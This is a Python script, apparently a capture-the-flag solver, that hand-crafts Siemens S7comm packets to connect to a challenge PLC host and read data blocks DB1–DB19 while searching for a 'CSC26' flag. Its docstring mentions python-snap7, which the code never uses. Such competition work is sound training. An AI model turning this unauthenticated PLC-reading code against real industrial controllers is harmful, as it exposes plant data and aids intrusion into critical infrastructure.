#!/usr/bin/env python3
"""
Try using python-snap7 if available, otherwise manual S7 protocol
"""

import socket
import struct
import sys

HOST = "mnbvcxzqwertyui-csc26.cybersecuritychallenge.al"
PORT = 10023

def manual_s7_read():
    """Manual S7 protocol implementation"""
    print("[*] Using manual S7 protocol implementation")
    
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(5)
    
    try:
        print(f"[*] Connecting to {HOST}:{PORT}...")
        sock.connect((HOST, PORT))
        print("[+] Connected!\n")
        
        # Step 1: COTP Connection Request
        print("[*] Sending COTP Connection Request...")
        cotp_cr = bytes([
            0x03, 0x00, 0x00, 0x16,  # TPKT Header
            0x11, 0xe0, 0x00, 0x00, 0x00, 0x01, 0x00,  # COTP CR
            0xc1, 0x02, 0x01, 0x00,  # Source TSAP
            0xc2, 0x02, 0x01, 0x02,  # Destination TSAP
            0xc0, 0x01, 0x0a  # TPDU Size
        ])
        
        sock.send(cotp_cr)
        response = sock.recv(1024)
        print(f"[<] COTP Response: {response.hex()}")
        
        if len(response) < 7:
            print("[-] Invalid COTP response")
            return None
        
        # Step 2: S7 Setup Communication
        print("\n[*] Sending S7 Setup Communication...")
        s7_setup = bytes([
            0x03, 0x00, 0x00, 0x19,  # TPKT
            0x02, 0xf0, 0x80,  # COTP DT
            0x32, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00,  # S7 Header
            0x08, 0x00, 0x00,  # Parameter length
            0xf0, 0x00, 0x00, 0x01, 0x00, 0x01, 0x01, 0xe0  # Parameters
        ])
        
        sock.send(s7_setup)
        response = sock.recv(1024)
        print(f"[<] S7 Setup Response: {response.hex()}")
        
        # Step 3: Read Data Blocks
        print("\n[*] Reading Data Blocks...")
        
        for db_num in range(1, 20):
            print(f"\n[*] Reading DB{db_num}...")
            
            # Build S7 Read Request
            s7_read_header = bytes([
                0x03, 0x00, 0x00, 0x1f,  # TPKT (length will be updated)
                0x02, 0xf0, 0x80,  # COTP DT
                0x32, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00,  # S7 Header
                0x0e, 0x00,  # Parameter length (14 bytes)
                0x00, 0x00,  # Data length
                0x04,  # Read Var
                0x01,  # Item count
            ])
            
            # Read item specification
            read_item = bytes([
                0x12,  # Variable specification
                0x0a,  # Length of following address specification
                0x10,  # Syntax ID (S7ANY)
                0x02,  # Transport size (BYTE)
            ]) + struct.pack('>H', 256) + bytes([  # Length (256 bytes)
                db_num,  # DB number
                0x84,  # Area code (DB)
                0x00, 0x00, 0x00  # Address (0)
            ])
            
            s7_read = s7_read_header + read_item
            
            # Update TPKT length
            tpkt_length = len(s7_read)
            s7_read = s7_read[:2] + struct.pack('>H', tpkt_length) + s7_read[4:]
            
            sock.send(s7_read)
            
            try:
                response = sock.recv(4096)
                print(f"[<] Response length: {len(response)}")
                
                if len(response) > 20:
                    # Extract data (skip headers)
                    data = response[21:]  # Approximate header size
                    
                    # Check for flag
                    decoded = data.decode('ascii', errors='ignore')
                    
                    if 'CSC26' in decoded:
                        print(f"\n{'='*70}")
                        print(f"[!] FLAG FOUND IN DB{db_num}!")
                        print(f"{'='*70}")
                        print(f"Data (hex): {data.hex()}")
                        print(f"Data (ASCII): {decoded}")
                        sock.close()
                        return decoded
                        
            except socket.timeout:
                print("[-] Timeout")
        
        sock.close()
        
    except Exception as e:
        print(f"[-] Error: {e}")
        import traceback
        traceback.print_exc()
    
    return None

if __name__ == "__main__":
    print("="*70)
    print("S7 PLC Reader")
    print("="*70)
    
    flag = manual_s7_read()
    
    if flag:
        print(f"\n{'='*70}")
        print(f"[!] SUCCESS! Flag: {flag}")
        print(f"{'='*70}")
    else:
        print("\n[-] Flag not found")
